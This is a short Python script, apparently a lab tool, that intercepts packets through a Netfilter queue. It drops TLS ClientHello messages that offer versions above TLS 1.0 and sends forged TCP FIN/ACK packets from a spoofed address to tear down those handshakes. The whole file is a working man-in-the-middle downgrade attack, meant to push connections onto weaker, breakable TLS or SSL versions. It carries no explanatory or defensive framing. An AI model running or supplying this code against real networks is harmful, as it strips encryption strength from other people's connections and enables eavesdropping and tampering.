import sys
import json
import requests
from scapy.layers.inet import IP, TCP
from scapy.all import send
from netfilterqueue import NetfilterQueue


def print_and_accept(pkt):
    # Get the payload
    raw = pkt.get_payload()
    ip = IP(raw)
    # Only do something if the payload contains TCP and Raw layers
    if ip.haslayer('Raw'):
        tcpPayload = ip['Raw'].load
        # Check if it is a ClientHello package and a version greater then TLS1.0 is proposed
        if tcpPayload[0] == 0x16 and tcpPayload[1] == 0x03 and tcpPayload[5] == 0x01 and tcpPayload[10] > 0x01:
            pkt.drop()
            new_packet = IP(dst=ip['IP'].dst, src='172.16.0.3')/TCP()
            new_packet['TCP'].sport = ip['TCP'].sport
            new_packet['TCP'].dport = ip['TCP'].dport
            new_packet['TCP'].seq = ip['TCP'].seq
            new_packet['TCP'].ack = ip['TCP'].ack
            new_packet['TCP'].flags = 'FA'
            send(new_packet)
        else:
            pkt.accept()
    else:
        pkt.accept()

# Initialize the queue and bind the function to run
nfqueue = NetfilterQueue()
nfqueue.bind(1, print_and_accept, 100)
try:
    nfqueue.run()
except KeyboardInterrupt:
    print('')

nfqueue.unbind()